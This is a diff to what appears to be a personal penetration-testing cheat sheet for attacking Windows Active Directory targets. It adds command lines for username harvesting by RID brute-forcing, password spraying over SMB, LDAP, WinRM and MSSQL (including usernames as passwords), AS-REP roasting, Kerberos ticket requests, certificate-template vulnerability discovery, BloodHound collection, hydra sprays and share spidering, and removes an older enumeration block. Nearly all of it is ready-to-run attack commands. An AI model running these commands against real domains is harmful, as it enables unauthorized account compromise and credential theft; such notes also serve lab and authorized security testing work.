@@ -112,21 +112,28 @@ cat *VERSIONS*nmap | grep -E 'open|report for|script results||' | grep -vE '///|
 
 # Exploitation
 ## Initial Enumeration
-dirsearch -u http://$TARGET -w /usr/share/wordlists/assetnote/directories.txt -x 400,403,404 --exclude-sizes 12B
+dirsearch -u http://$TARGET --exclude-sizes 12B
 ffuf -u https://$DOM/ -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 4242 -t 50 -rate 5000
-nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'; echo ''
+
+nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' | grep -Ei 'dns'
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
-impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
+nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee usernames
+
+nxc smb "$TARGET" -u usernames -p passwords; nxc smb "$TARGET" -u usernames -p usernames
+nxc ldap "$TARGET" -u usernames -p passwords; nxc ldap "$TARGET" -u usernames -p usernames
+nxc winrm "$TARGET" -u usernames -p passwords; nxc winrm "$TARGET" -u usernames -p usernames
+nxc mssql "$TARGET" -u usernames -p passwords; nxc mssql "$TARGET" -u usernames -p usernames
+
 sudo ntpdate -u $TARGET
 impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
 impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
-impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
-certipy-ad find -dc-ip $TARGET -u '$USERNAME' -target $DC -k -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
+certipy-ad find -dc-ip $TARGET -u '$USERNAME' -target $DC -k -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
 
 ## Spray
 (nxc winrm "$TARGET" --dns-server $TARGET -u usernames -p passwords &)
@@ -726,10 +733,6 @@ nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=80530636
 +---------- Spray Service ----------+
 (hydra -I smb://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 (hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
-
-+---------- Get Shares, Users and Groups ----------+
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' >> usernames; cat usernames | sort -u | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --groups | grep 'membercount' | cut -d':' -f1 | sed 's/^[^ ]* *[^ ]* *[^ ]* *[^ ]* *//' | sed 's/ *membercount.*//' >> groups
 
 +---------- Spider Share for Files ----------+
 NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d' | tee smbfiles_$USERNAME
